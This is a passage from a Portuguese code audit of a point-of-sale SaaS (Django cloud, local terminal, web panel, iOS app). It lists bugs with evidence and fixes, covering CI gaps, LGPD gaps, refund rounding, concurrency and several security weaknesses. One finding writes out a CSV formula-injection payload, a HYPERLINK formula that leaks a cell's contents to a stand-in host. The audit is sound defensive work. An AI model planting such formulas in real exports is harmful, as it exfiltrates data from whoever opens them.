- **Cenário de falha:** Todo caixa informa '2.0.0' no pareamento e no heartbeat, então painel e app iOS não distinguem um terminal de setembro de um atual; não dá para saber quais lojas enviam eventos no formato antigo antes de endurecer a validação da nuvem. Cada deploy substitui a tag 2.0.0, logo 'manter a imagem anterior' (DEPLOY-DOKPLOY.md) é impossível. Quem publicar o JSON gerado pelo script cria uma release 'pilot' que nenhum terminal vê; e depois de atualizado o caixa continua mostrando o aviso de versão nova.
- **Correção:** Uma fonte única de versão: gravar VERSION dentro de terminal/ no empacotamento e ler dali; CI que falha se a versão não mudou quando terminal/ ou shared/ mudaram; tag de imagem = versão + SHA do commit, publicada em registry pelo CI; alinhar o canal do script com o que o terminal consulta; terminal compara release.version com a instalada antes de mostrar o selo.

### CI não exercita produção: contrato terminal-nuvem roda em SQLite, configuração de produção nunca é importada, JS só passa por checagem de sintaxe e o caminho Windows/iOS não é construído

- **Onde:** `.github/workflows/ci-v2.yml:35` · área `testes-ci-distribuicao` · categoria `maintainability` · confirmado
- **Evidência:** O passo do terminal zera o banco (`DATABASE_URL: ''`, l.36-37) e o teste troca o NAME para um arquivo SQLite (test_contract_cloud.py:46-48), com um único método de teste (l.68). O job roda com `PDV_DEBUG: '1'` (l.22), então os ramos de produção do settings.py (l.18-31, 53, 105-110) nunca executam e não há `check --deploy`. JS: apenas `node --check` (l.38) para 3.750 linhas de app.js e 510 de terminal.js; não existe package.json nem teste de comportamento. Só `ubuntu-latest`; terminal/requirements.txt nunca é instalado; sem lint, sem xcodebuild; as imagens são construídas (l.39-40) e descartadas. tests/ e local_pdv/tests não entram (são do protótipo legado).
- **Cenário de falha:** A sincronização depende de select_for_update e de constraints do PostgreSQL (views_terminal.py:478), que no SQLite viram no-op: uma regressão de concorrência ou de tipo passa verde e só aparece com dois caixas reais. Um erro no ramo de produção do settings.py derruba o boot no deploy com CI verde. Uma função do painel quebrada em tempo de execução (cálculo de total, formulário de plano) chega ao cliente porque só a sintaxe é verificada.
- **Correção:** Rodar o contrato também contra o serviço postgres do job (criando banco de teste via runner do Django), dividir em vários casos; passo `PDV_ENV=production PDV_DEBUG=0 ... manage.py check --deploy` com segredos de CI; job windows-latest com terminal/requirements.txt; ruff + pip-audit; smoke test de navegador (Playwright) para login, venda e fechamento no terminal e no painel; job macOS com xcodebuild; publicar imagens versionadas e só permitir deploy de commit com CI verde.

### Dockerfile padrão da raiz constrói o protótipo antigo, que tem cadastro público e banco SQLite próprio

- **Onde:** `Dockerfile:10` · área `testes-ci-distribuicao` · categoria `security` · confirmado
- **Evidência:** `COPY app.py index.html backup.py logo-pdv2.svg ./` e `CMD ["python", "app.py"]` com `PDV_HOST=0.0.0.0` (l.3-7, 20) e HEALTHCHECK próprio em /health (l.17-18). app.py expõe `/api/register` (l.688) e grava em /data/pdv.sqlite3. compose.preview.yaml usa `build: .`. O README (l.104) diz que é protótipo preservado, mas os arquivos seguem na raiz junto de tests/ e local_pdv/.
- **Cenário de falha:** No Dokploy, criar o serviço como 'Application' (tipo Dockerfile, caminho padrão ./Dockerfile) em vez de Compose sobe o protótipo: o healthcheck fica verde, o domínio responde com uma tela de PDV, qualquer pessoa cria empresa pelo cadastro aberto e os dados vão para um SQLite sem licença, sem cobrança e fora do backup Restic. O erro só é percebido quando alguém procura os dados no painel verdadeiro.
- **Correção:** Remover do repositório app.py, index.html, backup.py, local_pdv/, tests/, Dockerfile e compose.preview.yaml (ficam no histórico do git) ou movê-los para legacy/; se algo precisar ficar, o Dockerfile da raiz deve falhar com mensagem apontando para compose.production.yaml.

### App iOS mostra números congelados depois que a sessão expira e trata qualquer 401 como senha errada

- **Onde:** `ios/PDV2OwnerMonitor/PDV2OwnerMonitor/AppSession.swift:54` · área `testes-ci-distribuicao` · categoria `ux-bug` · confirmado
- **Evidência:** refresh(): `catch { if snapshot == nil { message = ... } }` (l.54-58): com painel já carregado o erro é descartado. A sessão do servidor dura 8 h e o cookie é de sessão (settings.py:101-102), guardado só em HTTPCookieStorage (APIClient.swift:36), sem Keychain. APIClient.swift:14 traduz todo 401 como 'E-mail ou senha inválidos.'. Login com `response.memberships.first(where: { $0.role == "owner" })` (l.33) pega a primeira empresa em ordem alfabética, sem escolha. Para conta de plataforma com MFA o servidor devolve `memberships: []` (views_auth.py:185-186) e o app responde 'exclusivo do proprietário'. URL padrão `http://127.0.0.1:8000` (l.22).
- **Cenário de falha:** Dono deixa o app aberto no balcão. Após 8 horas o polling de 30 s passa a receber 401 e o painel continua exibindo o faturamento e os 'terminais online' da última leitura boa, sem aviso; o único indício é o horário pequeno de 'atualizado'. Ao fechar e reabrir o app o login é pedido de novo. Dono de duas empresas nunca vê a segunda. O próprio administrador da CrownTech (conta com MFA) não consegue entrar e recebe mensagem de permissão enganosa.
- **Correção:** Em refresh, tratar 401/403 encerrando a sessão e voltando ao login, e mostrar faixa 'sem atualização desde HH:MM' em qualquer falha; guardar credencial de renovação no Keychain (token de dispositivo de longa duração e somente leitura em vez de cookie de sessão); seletor de empresa quando houver mais de um vínculo owner; tela de código TOTP quando vier mfa_required; URL de produção como padrão; campos opcionais nos modelos Codable para tolerar evolução da API.

### LGPD: cadastro sem aceite de termos, sem política de privacidade publicada, e não há exportação nem exclusão de dados de cliente ou de conta

- **Onde:** `cloud/core/views_auth.py:121` · área `testes-ci-distribuicao` · categoria `security` · confirmado
- **Evidência:** register aceita só company, name, email e password e cria usuário e empresa sem registrar aceite nem versão de termos (l.121-159). Busca por 'privacidade', 'termos' e 'lgpd' em web/landing.html, web/app.html e web/assets/app.js não retorna nada. DELETE de cadastros apenas faz `values = {"active": False}` (views_resources.py:219-220), mantendo nome, CPF, telefone e histórico de fiado. Não existe rota de exportação dos dados de um titular nem de encerramento de conta em cloud/pdvcloud/urls.py; redefinição de senha só pelo administrador da plataforma (views_platform.py:141).
- **Cenário de falha:** Cliente de um lojista pede a exclusão ou a cópia dos seus dados (art. 18): o lojista não tem botão e a CrownTech, como operadora, precisa mexer no banco à mão. Lojista que cancela a assinatura não consegue levar seus dados nem pedir a eliminação. A publicação do app na App Store exige URL de política de privacidade (o próprio ios/README registra a pendência).
- **Correção:** Publicar /privacidade e /termos, com link na landing e no cadastro, e gravar aceite (versão, data, IP) em register; ação 'anonimizar cliente' que apaga nome, documento e contato preservando valores fiscais e financeiros; exportação por cliente (JSON/CSV) e exportação completa da empresa; fluxo de encerramento de conta com prazo de retenção documentado; redefinição de senha por e-mail usando o SMTP já configurado.

## Baixo (45)

### Sem redefinição de MFA e sem volta para funcionário SaaS que teve os papéis removidos

- **Onde:** `cloud/core/views_platform.py:128` · área `cloud-auth-tenancy` · categoria `maintainability` · não verificado
- **Evidência:** Não há endpoint que desative/zere `PlatformMFA` (views_auth.py só cria, confirma e regenera códigos; `platform_user_detail` aceita name/email/password/roles/active). PATCH com `roles: []` grava `is_staff = False` (linha 145); depois disso a regra das linhas 128-130 só permite promover quem é proprietário ativo de empresa, e criar de novo dá 409 por e-mail duplicado (linha 91).
- **Cenário de falha:** Operador perde o celular e os códigos de recuperação: fica fora do painel SaaS até alguém editar o banco à mão; se for o único superusuário, toda a administração para. Superusuário tira todos os papéis de um funcionário para suspender e não consegue mais devolvê-los pela tela.
- **Correção:** Ação de superusuário "redefinir MFA" (apaga segredo e códigos, auditada, exige MFA do próprio superusuário). Permitir re-promover usuário que já foi staff, ou usar apenas `active=false` para suspensão.

### Leituras não verificam assinatura: empresa com teste vencido ou cancelada continua usando painel, relatórios e monitor

- **Onde:** `cloud/core/api_common.py:138` · área `cloud-auth-tenancy` · categoria `money` · não verificado
- **Evidência:** `membership_context` só chama `subscription_window` quando `write=True` (linhas 138-139). `monitoring` usa `membership_context(request, roles={"owner"})` sem write (views_owner.py:48) e `require_feature` só olha `plan.features`, não o status (api_common.py:169-172).
- **Cenário de falha:** Assinatura `cancelled` ou trial vencido há meses: o dono continua abrindo o app iOS, o dashboard e os relatórios do plano contratado sem pagar. Pode ser intencional para consulta de histórico, mas hoje não há prazo nem distinção entre histórico e recursos pagos.
- **Correção:** Definir a regra: por exemplo, leitura liberada por 30 dias após o fim e, depois, só exportação; aplicar o status em `require_feature` para recursos pagos (monitor, relatórios).

### Cadastro sem verificação de e-mail permite testes gratuitos em série

- **Onde:** `cloud/core/views_auth.py:121` · área `cloud-auth-tenancy` · categoria `money` · não verificado
- **Evidência:** `register` cria User, Tenant e Subscription `trial` de 14 dias e já faz `login` (linhas 146-157) sem confirmar e-mail nem exigir CNPJ; o único freio é `take_rate(f"register:{ip}", 10, 3600)` (linha 123).
- **Cenário de falha:** Lojista cria nova conta com outro e-mail a cada 14 dias e segue usando sem pagar; ou alguém cadastra o e-mail de um terceiro, que depois recebe "E-mail já cadastrado" e não tem como recuperar a conta (não há reset de senha).
- **Correção:** Confirmar e-mail antes de liberar o pareamento de terminal; exigir CNPJ/CPF único por trial; bloquear novo trial para documento ou dispositivo já usado.

### Verificação de MFA aceita reuso do mesmo código e o contador de falhas não é atômico

- **Onde:** `cloud/core/views_auth.py:289` · área `cloud-auth-tenancy` · categoria `concurrency` · não verificado
- **Evidência:** `pyotp.TOTP(...).verify(code, valid_window=1)` (linha 289) sem guardar o último passo aceito (`last_used_at` é só informativo). `mfa.failed_attempts += 1` e a remoção do código de recuperação (linhas 298-311) acontecem sem `select_for_update`.
- **Cenário de falha:** Um código TOTP capturado (olhar por cima do ombro, proxy de phishing) vale de novo por até ~90 s em outra sessão. Duas requisições simultâneas com o mesmo código de recuperação entram as duas; requisições paralelas de IPs diferentes leem o mesmo `failed_attempts` e não disparam o bloqueio de 15 minutos.
- **Correção:** Gravar o contador de tempo do último TOTP aceito e recusar valor menor ou igual; envolver a verificação em `transaction.atomic()` com `PlatformMFA.objects.select_for_update()`.

### Data bem formatada porém inexistente derruba o endpoint de assinatura com erro 500

- **Onde:** `cloud/core/views_platform.py:321` · área `cloud-auth-tenancy` · categoria `correctness` · não verificado
- **Evidência:** `parse_datetime(value)` (linha 321, e linha 358 no VIP) levanta `ValueError` para datas bem formatadas mas inválidas; o decorador `endpoint` só captura `APIError` (api_common.py:26-33). Na linha 309, `data["status"] not in {...}` com valor lista levanta `TypeError`.
- **Cenário de falha:** Financeiro digita `2026-02-30T00:00:00-03:00` como fim do período: a API responde 500 com página HTML em vez de "Data inválida", e o painel mostra erro genérico.
- **Correção:** Envolver `parse_datetime` em try/except ValueError retornando APIError("Data inválida") e validar `isinstance(status, str)` antes do `in`.

### Devoluções parciais arredondam cada parcela para cima; a soma pode passar do valor pago na linha

- **Onde:** `cloud/core/credit_logic.py:22` · área `cloud-vendas-dinheiro` · categoria `money` · não verificado
- **Evidência:** return_line_amount = `line_total * returned / line_quantity` com ROUND_HALF_UP por devolução, e validate_return exige exatamente esse valor (l.124) sem limitar o acumulado devolvido ao line_total_cents (só a quantidade é acumulada em `already`). A mesma regra está no terminal (store.py:41).
- **Cenário de falha:** Linha de 3 un. por R$ 5,00 no total. Três devoluções de 1 un. em dias diferentes: 166,67 -> R$ 1,67 cada = R$ 5,01 devolvidos para R$ 5,00 pagos. Em item por peso (R$ 1,50 por 1 kg), devoluções de 4 g arredondam 0,6 para 1 centavo cada, e fracionando a devolução o total reembolsado supera o pago. Gera diferença de caixa e crédito de loja maior que a venda.
- **Correção:** Na última devolução da linha (quantidade acumulada == quantidade vendida) usar `line_total - soma já devolvida`; nas demais, limitar a `line_total - soma já devolvida`. Aplicar a mesma regra em terminal/store.py::_return_amount e guardar o valor acumulado por linha.

### Eventos de caixa localizam CashSession/CashMovement só pela PK, sem conferir empresa/terminal, e aggregate_id não é validado como UUID

- **Onde:** `cloud/core/cash_logic.py:30` · área `cloud-vendas-dinheiro` · categoria `security` · não verificado
- **Evidência:** `CashSession.objects.get_or_create(pk=uuid.UUID(str(session_id)), defaults={"tenant": terminal.tenant, ...})` e `CashMovement.objects.get_or_create(pk=uuid.UUID(str(event["aggregate_id"])), ...)` (l.59-60); em seguida apply_cash_event sobrescreve opening_cents/closed_at/counted_cents da sessão encontrada. Sale, SaleReturn e CreditReceipt conferem tenant no reenvio (sale_logic.py:142, credit_logic.py:190,241); caixa não. _validate_event só aplica `text(aggregate_id, 160)` para cash.* (views_terminal.py:369,410-438).
- **Cenário de falha:** Um terminal pareado na empresa B que envie cash.opened/cash.closed com o UUID de uma sessão da empresa A (ou de outro terminal da mesma empresa) altera abertura, contagem e diferença dessa sessão. Exige conhecer o UUID, por isso a severidade baixa. Além disso, um aggregate_id que não seja UUID gera ValueError não tratado (HTTP 500) em vez de erro de validação.
- **Correção:** Em _session e no get_or_create de CashMovement, após obter o registro existente verificar `tenant_id == terminal.tenant_id` e `terminal_id == terminal.id` (senão APIError 409); validar aggregate_id com uuid_value em _validate_event para todos os eventos cash.*.

### CSV de relatórios permite injeção de fórmula no Excel

- **Onde:** `cloud/core/views_reports.py:276` · área `cloud-estoque-catalogo` · categoria `security` · não verificado
- **Evidência:** _csv_value devolve `str(value)` para colunas de texto (linha 276) e o writer grava direto (linha 303). Campos como motivo de ajuste (`reason`, digitado no caixa via evento stock.adjusted), nome de produto, nome de operador e nome de promoção chegam sem neutralização.
- **Cenário de falha:** Operador registra ajuste de estoque com motivo `=HYPERLINK("http://x/?"&A1;"ver")` ou `@SUM(...)`. O gerente exporta 'Perdas e ajustes de estoque' em CSV e abre no Excel: a célula é interpretada como fórmula (exfiltração por link ou alteração de valores exibidos).
- **Correção:** Em _csv_value, para kind 'text', prefixar com apóstrofo quando o valor começar com =, +, -, @, tab ou CR; manter números formatados como hoje.

### XML de NF-e malformado gera erro 500 ou mensagem enganosa em vez de 400

- **Onde:** `cloud/core/nfe.py:98` · área `cloud-estoque-catalogo` · categoria `correctness` · não verificado
- **Evidência:** `int(det.get("nItem") or ...)` (linha 98) levanta ValueError com nItem não numérico; `Decimal("NaN")`/`Infinity` passam por _decimal (linhas 29-34) e estouram InvalidOperation em `quantity <= 0`/quantize (linhas 83, 107); só ET.ParseError é capturado (linhas 58-61), então encoding desconhecido no prólogo também vira exceção não tratada. Valores não têm teto (vProd gigante → DataError no banco) e vDesc > vProd gera custo negativo → IntegrityError traduzido como 'Esta NF-e já foi importada ou há código duplicado' (views_purchases.py:191-192). nItem repetido é colapsado em by_number (views_purchases.py:121), descartando um item em silêncio.
- **Cenário de falha:** Fornecedor envia XML exportado de ERP com nItem vazio/duplicado ou valor 'NaN': o preview retorna 500 genérico e o usuário não sabe o que corrigir; com desconto maior que o item a tela diz que a nota já foi importada.
- **Correção:** Capturar ValueError/LookupError/InvalidOperation em parse e converter em APIError; exigir `value.is_finite()` e limites (0 ≤ valor ≤ 10**12) em _decimal/_cents; rejeitar total de item negativo e nItem repetido com mensagem própria.

### Custo dos produtos vaza para o caixa pelo detalhe da grade

- **Onde:** `cloud/core/product_groups.py:88` · área `cloud-estoque-catalogo` · categoria `security` · não verificado
- **Evidência:** views_resources.response_for remove cost_cents quando member.role == 'cashier' (linhas 27-31), mas product_group_detail (GET liberado a qualquer papel: `_member` usa roles=None para leitura, linhas 92-93 e 129-132) devolve `product_data(p)` cru para cada variação (linha 88).
- **Cenário de falha:** Operador de caixa chama GET /api/v1/product-groups/<id> e lê o custo de todas as variações da grade, informação que o restante da API esconde dele de propósito.
- **Correção:** Em group_data receber o member e aplicar a mesma regra de response_for (pop de cost_cents para cashier), ou centralizar a remoção no serializer com o papel como parâmetro.

### Transferência: idempotência não compara conteúdo e locks de produto em ordem do request permitem deadlock

- **Onde:** `cloud/core/views_transfers.py:51` · área `cloud-estoque-catalogo` · categoria `concurrency` · não verificado
- **Evidência:** `previous = StockTransfer.objects.filter(tenant=tenant, idempotency_key=key).first(); if previous: return JsonResponse(transfer_data(previous))` (linhas 51-53) devolve 200 mesmo com lojas/itens diferentes, ao contrário de movements/receipts, que respondem 409. Os produtos são travados com select_for_update na ordem enviada (linha 64), sem lock do tenant; record_receipt trava produtos na ordem da nota (views_stock.py:176).
- **Cenário de falha:** Painel reaproveita a chave ao reenviar um formulário editado: o usuário vê 'sucesso' mas a transferência gravada é a anterior, com outros itens. Duas transferências simultâneas com os produtos A,B e B,A (ou uma transferência e uma entrada de NF-e) entram em deadlock; o Postgres aborta uma e a API devolve 500.
- **Correção:** Guardar content_hash em StockTransfer e responder 409 quando a chave vier com dados diferentes; ordenar os itens por product_id antes de travar (e fazer o mesmo em record_receipt) ou travar o tenant como nas entradas.

### Resolver conflito de sincronização no terminal sempre dá erro 500: a coluna 'resolution' não existe em sync_conflicts

- **Onde:** `terminal/store.py:429` · área `terminal-backend` · categoria `correctness` · não verificado
- **Evidência:** `UPDATE sync_conflicts SET status=?,resolution=?,resolved_at=? WHERE id=?` (store.py:429), mas a tabela é criada só com id,event_id,event_type,aggregate_id,reason,status,detail,created_at,resolved_at (store.py:168-172) e nenhuma migração adiciona a coluna (store.py:184-203). Confirmado em banco temporário: sqlite3.OperationalError 'no such column: resolution'.
- **Cenário de falha:** POST /api/sync/conflicts/<id>/resolve (app.py:429-435) devolve 500 em qualquer chamada; o contador 'conflicts' de sync_status (store.py:357) nunca diminui no terminal, mesmo depois de o conflito ser resolvido no painel.
- **Correção:** Adicionar `resolution TEXT NOT NULL DEFAULT ''` ao CREATE TABLE e um ALTER TABLE condicional no __init__; atualizar o status local a partir da nuvem no bootstrap.

### 'Corrigir pareamento de teste' (unpair) nunca funciona em produção: o backup automático feito 5 s após parear já conta como histórico

- **Onde:** `terminal/store.py:278` · área `terminal-backend` · categoria `ux-bug` · não verificado
- **Evidência:** _has_business_history() retorna True se existir qualquer arquivo em backups/ (`any((self.path.parent / "backups").glob("terminal-*.sqlite3"))`, store.py:278-279) e a ação de auditoria 'terminal.backup' (store.py:1580) não está na lista de exceções (linhas 284-286). O worker executa backup_now() no primeiro ciclo após o pareamento, pois last_backup_at é 0 (sync.py:215-217). Confirmado: set_pairing + backup_now -> unpair() responde 409 'contém histórico desta empresa'.
- **Cenário de falha:** O instalador pareia com a licença errada e clica em 'Corrigir pareamento' segundos depois: recebe sempre o erro de histórico, sem ter feito nenhuma venda, e só resta criar outro perfil (novo device_id e novo terminal no painel).
- **Correção:** Em _has_business_history ignorar backups e a ação 'terminal.backup' quando não houver vendas, caixas, movimentos ou outbox; ou só iniciar o backup automático após a primeira movimentação.

### O recibo ESC/POS não envia o pulso de abertura da gaveta em nenhuma situação

- **Onde:** `terminal/printers.py:338` · área `terminal-backend` · categoria `ux-bug` · não verificado
- **Evidência:** layout_bytes() termina apenas com avanço e corte (`b"\x1d!\x00\x1bE\x00\x1ba\x00\x1dVB\xa0"`, printers.py:338); não há ESC p (`\x1bp`) em terminal/*.py nem rota para abrir a gaveta (busca por 'x1bp', 'drawer' e 'gaveta' sem ocorrências de comando).
- **Cenário de falha:** Venda em dinheiro com troco, sangria ou suprimento: a gaveta ligada à impressora térmica não abre; o operador precisa usar a chave ou deixar a gaveta aberta, o que anula o controle de caixa que o sistema calcula.
- **Correção:** Acrescentar ESC p 0 25 250 (pino configurável por impressora) ao recibo quando houver pagamento em dinheiro e criar ação 'abrir gaveta' auditada (com PIN de gerente fora de venda) para sangria, suprimento e fechamento.

### Deploy mata o worker no meio de chamada ao provedor (grace padrão de 10s) e a operação cai em revisão manual

- **Onde:** `compose.production.yaml:65` · área `operations-integracoes` · categoria `concurrency` · não verificado
- **Evidência:** O serviço `worker` (l.65-74) não define `stop_grace_period`; o Docker envia SIGKILL 10s após o SIGTERM. O worker só para entre iterações (operations/worker.py:16-23) e cada chamada HTTP pode levar até 40s (integrations/base.py:16, timeout=(5,35)); `subscribe` faz até 3 chamadas em sequência. Jobs de mutação interrompidos viram `needs_review` após 5 minutos (operations/services.py:216-217).
- **Cenário de falha:** Um redeploy no Dokploy coincide com uma contratação ou emissão fiscal em andamento: o container é morto, o job `billing.subscribe` vai para `needs_review` e, pelo bloqueio da view de contratação, a empresa fica sem conseguir assinar até a equipe de cobrança conciliar manualmente.
- **Correção:** Adicionar `stop_grace_period: 150s` ao worker (e 60s ao cloud, compatível com `--timeout 60` do gunicorn); opcionalmente verificar `running` antes de iniciar um novo job e registrar no log o job interrompido.

### Stripe (cartão) não existe no código e o modelo de cobrança está acoplado ao Asaas

- **Onde:** `operations/models.py:35` · área `operations-integracoes` · categoria `maintainability` · não verificado
- **Evidência:** Nenhuma ocorrência de 'stripe' no repositório. `BillingBinding` (l.35-44) não tem coluna `provider`; `reconcile_payment` fixa `provider='asaas'` (operations/services.py:85-87) e usa `account('asaas')`; a única rota de webhook é `webhooks/asaas` (operations/urls.py:8); a view de contratação só aceita PIX/BOLETO/UNDEFINED (operations/views.py:150) e a UI só oferece Pix e Boleto (web/assets/app.js:3247). `IntegrationAccount` já é genérico por provedor (models.py:5-15).
- **Cenário de falha:** Cliente que quer pagar a assinatura com cartão de crédito recorrente não tem opção no painel; a única via hoje é chamar a API com `billing_type='UNDEFINED'` e pagar com cartão na fatura hospedada do Asaas, sem tratamento próprio de chargeback (ver achado de estorno).
- **Correção:** Caminho curto: liberar `CREDIT_CARD`/`UNDEFINED` na UI usando a fatura hospedada do Asaas. Para Stripe: (1) `integrations/stripe_billing.py` com Checkout Session em modo subscription e Customer Portal; (2) coluna `provider` em `BillingBinding` e chave única (provider, external_id) em `BillingInvoice`; (3) rota `webhooks/stripe` validando a assinatura `Stripe-Signature` com o segredo do endpoint e tolerância de tempo, deduplicando por `event.id`; (4) reconciliar por consulta canônica da invoice (`invoice.paid`, `invoice.payment_failed`, `customer.subscription.deleted`, `charge.dispute.created`), reaproveitando a regra de período de `reconcile_payment`; (5) mapear Plan → Price ID do Stripe; (6) credencial via `IntegrationAccount(provider='stripe')` cifrada como as demais.

### state.renderId é usado ao mesmo tempo como identidade da página e da requisição: busca com debounce disparada após navegar invalida a página nova

- **Onde:** `web/assets/app.js:826` · área `painel-js-1` · categoria `concurrency` · não verificado
- **Evidência:** resourcePage: `timer = setTimeout(() => load(input.value.trim()), 250)` (820) e `load` faz `const token = ++state.renderId` (826). O timer não é cancelado ao sair da página. As outras páginas comparam seu token com state.renderId (ex.: salesPage 1158: `if (token !== state.renderId) return;`).
- **Cenário de falha:** Usuário digita na busca de Produtos e clica em "Vendas" em menos de 250 ms: o timer dispara load() de Produtos, incrementa renderId, e a resposta de /sales é descartada como obsoleta. A tela de Vendas fica presa em "Carregando dados…" até nova navegação.
- **Correção:** Guardar o timer e cancelá-lo quando `current !== state.renderId` (ou checar isso no início de load); usar contador de requisição local por página em vez do contador global.

### Sessão expirada: `next` leva o hash e o login o rejeita; usuário com acesso duplo cai na área errada

- **Onde:** `web/assets/app.js:81` · área `painel-js-1` · categoria `ux-bug` · não verificado
- **Evidência:** handleError: `location.assign("/login/?next=" + encodeURIComponent(location.pathname + location.hash))`. auth.js só aceita next exatamente igual a "/app/" ou "/platform/" (auth.js:88-89), e hasMultipleAccountTypes retorna false quando há next (auth.js:96), então destination() cai em `platformAccess && !memberships.length ? "/platform/" : "/app/"` (auth.js:90).
- **Cenário de falha:** Administrador SaaS que também é membro de uma empresa está em /platform/#tenants quando a sessão expira; após logar de novo é levado para /app/ (painel da empresa) sem a tela de escolha, e a seção em que estava é perdida. Qualquer usuário perde a seção (#sales, #stock) ao relogar.
- **Correção:** Em auth.js, separar pathname e hash do next, validar o pathname contra a lista permitida e preservar o hash; ou enviar apenas location.pathname e guardar o hash em sessionStorage.

### innerHTML com dados interpolados sem escape completo (SKU, unidade da NF-e); hoje não explorável apenas por validação do servidor

- **Onde:** `web/assets/app.js:1632` · área `painel-js-1` · categoria `security` · não verificado
- **Evidência:** `wrap.innerHTML = `... Unidades por ${item.unit || "unidade"} da nota<input ...>`` (1627-1633) com item.unit vindo do XML do fornecedor; `<option value="${p.id}">${p.name.replace(/</g, "&lt;")} · ${p.sku}</option>` (1623 e 1835) com sku cru. Verifiquei que o servidor trunca uCom em 6 caracteres (cloud/core/nfe.py:104) e que o SKU é sempre gerado (views_resources.py:47; "sku" fora dos campos aceitos), então não há execução de script hoje. Um uCom como "<style" ainda quebra o template: o input de fator e .nfe-hint deixam de existir e renderNfe lança TypeError (linha 1639).
- **Cenário de falha:** NF-e com uCom iniciando em "<" (XML malformado ou malicioso) faz a importação falhar com "Não foi possível ler a NF-e". Se no futuro o SKU passar a ser editável/importável ou o limite de uCom aumentar, vira XSS armazenado no painel do proprietário.
- **Correção:** Montar esses trechos com el()/textContent ou passar todos os valores por labelHtmlEscape() (já existe na linha 590), inclusive unit, sku e id.

### Acessibilidade: foco inicial do diálogo cai sempre no botão "×" e vários campos não têm rótulo associado

- **Onde:** `web/assets/app.js:363` · área `painel-js-1` · categoria `ux-bug` · não verificado
- **Evidência:** `const initial = panel.querySelector("input,select,textarea,button"); (initial || close).focus();` — o cabeçalho (com o botão ×) vem antes do corpo no DOM, então `initial` é sempre o botão de fechar. Em panelReturn (1058) e receiveTransfer (1887) os `label` não têm htmlFor/id; em transferForm (1838) o select de produto e o input de quantidade não têm label, só placeholder.
- **Cenário de falha:** Usuário de teclado ou leitor de código de barras abre um diálogo e tecla Enter (ou bipa um código, que termina com Enter): o foco está no × e o diálogo fecha. Leitor de tela anuncia "caixa de edição" sem nome nos campos de quantidade da devolução e da transferência.
- **Correção:** Buscar o primeiro focável dentro de `body` (`body.querySelector(...) || close`); associar label/id (ou aria-label) nos campos gerados dinamicamente.

### handleError mostra "Sem conexão com a nuvem" e manda abrir o terminal local para qualquer erro 5xx, inclusive no admin SaaS, e duplica o aviso

- **Onde:** `web/assets/app.js:84` · área `painel-js-1` · categoria `ux-bug` · não verificado
- **Evidência:** `if (error?.status === 0 || error?.status >= 500) { toast("Sem conexão com a nuvem. Para continuar as vendas, abra o terminal local em http://127.0.0.1:8010/.", "error"); }` seguido de um segundo toast/feedback com errorText(error); não há distinção entre falha de rede (status 0) e erro interno (500), nem entre /app/ e /platform/.
- **Cenário de falha:** Um bug no servidor devolve 500 ao salvar um plano no admin SaaS: o operador da plataforma vê "Sem conexão com a nuvem... abra o terminal local" e outro toast com "O servidor apresentou uma falha". O diagnóstico vai para a rede do usuário em vez do servidor, e o cliente recebe a mesma orientação errada.
- **Correção:** Exibir a mensagem de offline apenas para status 0 e fora de /platform/; para 5xx mostrar somente a mensagem de falha do servidor.

### Service worker: shell HTML só é cacheado na instalação, e o botão da página offline é bloqueado pela CSP

- **Onde:** `web/sw.js:22` · área `painel-js-2` · categoria `ux-bug` · não verificado
- **Evidência:** O ramo de navegação faz `fetch(request).catch(() => caches.match(url.pathname) || caches.match("/offline/"))` (l.22-28) e nunca regrava o HTML; o shell só entra no cache em `cache.addAll(SHELL)` na instalação (l.10) e o nome do cache é uma constante manual (l.1). web/offline.html:17 usa `onclick="location.reload()"`, mas /offline/ sai com CSP `script-src 'self'` (operations/middleware.py:10). Ponto positivo conferido: para /assets/ a estratégia é rede primeiro (l.31-38) e o WhiteNoise serve app.js sem hash com max-age curto, então online o SW não serve JS antigo.
- **Cenário de falha:** Deploy altera app.html sem mexer em sw.js: em queda de rede ou durante o restart do container, o SW entrega o app.html da época da instalação junto com o app.js mais recente em cache; se o JS novo espera um elemento que o HTML antigo não tem (ex.: `$("#avatar").addEventListener` na l.437), o módulo quebra e a tela fica presa em "carregando". Na página offline, "Tentar novamente" não faz nada. Também não há aviso de nova versão para abas abertas.
- **Correção:** No ramo navigate, regravar a resposta ok no cache (`cache.put(url.pathname, response.clone())`); gerar o nome do CACHE a partir da versão/commit no build; trocar o onclick inline por um <a href=""> ou por script em /assets; opcionalmente avisar "nova versão disponível" no controllerchange.

### Estados vindos do servidor aparecem em inglês e sem cor (done, authorized, rejected, healthy)

- **Onde:** `web/assets/app.js:3135` · área `painel-js-2` · categoria `ux-bug` · não verificado
- **Evidência:** As tarefas usam `statusBadge(row.status)` (l.3135, l.3169) e os documentos fiscais também (l.3124), mas statusNames (l.19) não tem "done" (estado final real em operations/services.py run_one), nem "authorized", "rejected", "denied", "pending", "processing", "overdue", "disputed". Em Backups, `metric("Estado do backup",result.state||"—")` (l.3211) mostra healthy/stale/error/unknown cru, embora statusNames tenha essas traduções.
- **Cenário de falha:** O lojista vê em Integrações uma tarefa "done" e um documento "authorized" em cinza neutro, sem saber se deu certo; a nota "rejected" não aparece em vermelho. No admin SaaS o cartão de backup mostra "stale".
- **Correção:** Adicionar ao statusNames: done→Concluída, authorized→Autorizada, rejected/denied→Rejeitada/Denegada, pending/processing→Em processamento, overdue→Vencida, disputed→Em disputa, e incluir esses valores nas listas de tom do statusBadge; usar statusBadge também no cartão de backup.

### Busca do Estoque dispara depois de sair da tela e deixa a página seguinte presa no carregamento

- **Onde:** `web/assets/app.js:2337` · área `painel-js-2` · categoria `concurrency` · não verificado
- **Evidência:** O input de busca agenda `searchTimer=setTimeout(load,250)` (l.2337-2340) e esse timer não é cancelado ao trocar de rota. `load()` faz `const token = ++state.renderId` (l.2254). As outras páginas descartam a resposta quando `token !== state.renderId`.
- **Cenário de falha:** Usuário digita no campo de busca do Estoque e clica em "Vendas" em menos de 250 ms: a página Vendas inicia (renderId N+1), o timer do Estoque dispara e incrementa para N+2; quando a resposta de Vendas chega ela é descartada e a tela fica com o esqueleto de carregamento até o usuário navegar de novo.
- **Correção:** Em load(), abortar se `current` da stockPage não for mais a página ativa (ex.: guardar um contador próprio da página, ou checar `results.isConnected` antes de incrementar state.renderId) e limpar o timer no renderRoute.

### Financeiro: título lançado errado não pode ser corrigido nem cancelado pelo painel

- **Onde:** `web/assets/app.js:2403` · área `painel-js-2` · categoria `correctness` · não verificado
- **Evidência:** A única ação da tabela é "Liquidar" para títulos em aberto (l.2403). A API já oferece PATCH e DELETE em /finance/<id> (cloud/core/views_finance.py finance_detail: DELETE vira status cancelled), mas o painel não chama nenhum dos dois.
